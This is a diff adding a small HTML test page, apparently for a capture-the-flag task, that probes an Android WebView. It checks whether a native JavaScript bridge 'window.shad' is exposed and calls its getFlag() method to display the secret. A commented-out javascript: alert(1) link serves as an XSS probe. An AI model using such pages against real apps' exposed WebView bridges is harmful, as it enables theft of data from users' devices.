@@ -1,0 +1,85 @@
+<!-- <html>
+<head>
+</head>
+<body style="background-color:red;">
+kek
+<a href="javascript://alert(1);">hello_world</a>
+</body>
+<script>
+document.body.style="background-color:purple;"
+</script>
+</html> -->
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>kek — test page for WebView XSS</title>
+  <style>
+    body{font-family:system-ui,Roboto,Arial;padding:18px}
+    pre{background:#f6f8fa;padding:12px;border-radius:8px;overflow:auto}
+    .ok{color:green;font-weight:700}
+    .bad{color:#b00;font-weight:700}
+    button{margin-top:10px;padding:8px 12px;border-radius:6px}
+  </style>
+</head>
+<body>
+  <h1>kek.html — тест WebView</h1>
+
+  <p><strong>Referrer / where we were opened from:</strong></p>
+  <pre id="ref">(none)</pre>
+
+  <p><strong>window.shad присутствует?</strong> <span id="hasShad">…</span></p>
+
+  <h2>Результат вызова <code>window.shad.getFlag()</code> (если доступно)</h2>
+  <pre id="flag">не вызвано</pre>
+
+  <button id="tryBtn">Попытаться вызвать window.shad.getFlag()</button>
+
+<script>
+  document.getElementById('ref').textContent = document.referrer || '(none)';
+
+  function updatePresence(){
+    const el = document.getElementById('hasShad');
+    if (window.shad && typeof window.shad.getFlag === 'function') {
+      el.textContent = 'да';
+      el.className = 'ok';
+    } else if (window.shad) {
+      el.textContent = 'есть, но getFlag не функция';
+      el.className = 'bad';
+    } else {
+      el.textContent = 'нет';
+      el.className = 'bad';
+    }
+  }
+
+  async function tryGetFlag(){
+    const out = document.getElementById('flag');
+    if (!window.shad) {
+      out.textContent = 'window.shad не определён в этом окружении';
+      return;
+    }
+    try {
+      // Некоторые реализации возвращают синхронно строку; попробуем безопасно
+      let result = window.shad.getFlag();
+      // если результат — Promise (маловероятно), дождёмся
+      if (result && typeof result.then === 'function') {
+        result = await result;
+      }
+      out.textContent = String(result);
+      console.log('FLAG (shown on page):', result);
+    } catch (e) {
+      out.textContent = 'ошибка при вызове: ' + e;
+    }
+  }
+
+  document.getElementById('tryBtn').addEventListener('click', tryGetFlag);
+
+  // автоматическая попытка через 500ms (чтобы дать WebView время инициализироваться)
+  setTimeout(() => {
+    updatePresence();
+    // не вызываем автоматически getFlag — оставим для ручного теста
+  }, 500);
+</script>
+</body>
+</html>
